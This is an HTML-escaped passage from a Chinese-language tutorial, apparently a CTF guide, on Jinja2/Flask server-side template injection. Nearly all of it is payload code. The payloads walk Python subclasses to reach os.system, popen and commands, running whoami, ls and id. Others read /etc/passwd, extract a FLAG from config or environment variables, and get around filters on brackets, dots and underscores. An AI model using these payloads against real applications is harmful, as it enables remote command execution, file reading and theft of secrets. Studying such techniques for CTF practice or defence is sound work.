class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;warnings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;catch_warnings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看 linecatch 的位置：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__base__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fm&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__globals__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;linecache&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查找 os 模块的位置：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__base__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fm&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__globals__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;linecache&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__dict__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;os&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查找 system 方法的位置：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__base__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fm&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__globals__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;linecache&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__dict__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;values&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__dict__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;调用 system 方法：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__base__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fm&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__globals__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;linecache&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__dict__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;values&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__dict__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;values&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;144&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;whoami&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;No.3&lt;/b&gt;&lt;/p&gt;&lt;p&gt;利用 commands 进行命令执行。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__bases__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fm&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__globals__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;__builtins__&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;__import__&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;commands&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getstatusoutput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;ls&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__bases__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fm&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__globals__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;__builtins__&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;__import__&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;os&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;ls&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__bases__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fm&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__globals__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__builtins__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;__import__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;os&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;姿势集🪓&lt;/h2&gt;&lt;p&gt;1️⃣&lt;/p&gt;&lt;p&gt;{{config}} 可以获取当前设置，如果题目是这样的：&lt;/p&gt;&lt;blockquote&gt;app.config [&amp;#39;FLAG&amp;#39;] = os.environ.pop（&amp;#39;FLAG&amp;#39;）&lt;/blockquote&gt;&lt;p&gt;可以直接访问 {{config[&amp;#39;FLAG&amp;#39;]}} 或者 {{config.FLAG}} 得到 flag。&lt;/p&gt;&lt;p&gt;2️⃣&lt;/p&gt;&lt;p&gt;同样可以找到 config。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;p&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__dict__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_TemplateReference__context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;3️⃣&lt;/p&gt;&lt;p&gt;[]、()&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;p&quot;&gt;{{[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__base__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fm&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__globals__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;os&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__dict__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;environ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;FLAG]}}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;4️⃣&lt;/p&gt;&lt;p&gt;url_for、g、request、namespace、lipsum、range、session、dict、get_flashed_messages、cycler、joiner、config等&lt;/p&gt;&lt;p&gt;如果上面提到的 config、self 不能使用，要获取配置信息，就必须从它的全局变量（访问配置 current_app 等）。例如：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;p&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url_for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__globals__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;current_app&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FLAG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_flashed_messages&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__globals__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;current_app&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FLAG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;application&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__self__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_get_data_for_json&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__globals__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;json&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;JSONEncoder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__globals__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;current_app&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;FLAG&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]}}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;5️⃣&lt;/p&gt;&lt;p&gt;过滤了 []、.&lt;/p&gt;&lt;p&gt;pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__mro__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fm&quot;&gt;__getitem__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;/etc/passwd&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在这里使用 pop 函数并不会真的移除，但却能返回其值，取代中括号来实现绕过。&lt;/p&gt;&lt;p&gt;若.也被过滤，使用原生 JinJa2 函数 |attr()&lt;/p&gt;&lt;p&gt;即将 request.__class__ 改成 request|attr(&amp;#34;__class__&amp;#34;) &lt;/p&gt;&lt;p&gt;6️⃣&lt;/p&gt;&lt;p&gt;过滤下划线 _&lt;/p&gt;&lt;p&gt;利用 request.args 的属性&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;p&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mro&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;subclasses&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;/etc/passwd&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mro&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__mro__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;subclasses&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将其中的 request.args 改为 request.values，则利用 post 的方式进行传参。&lt;/p&gt;&lt;p&gt;GET:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;p&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mro&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span 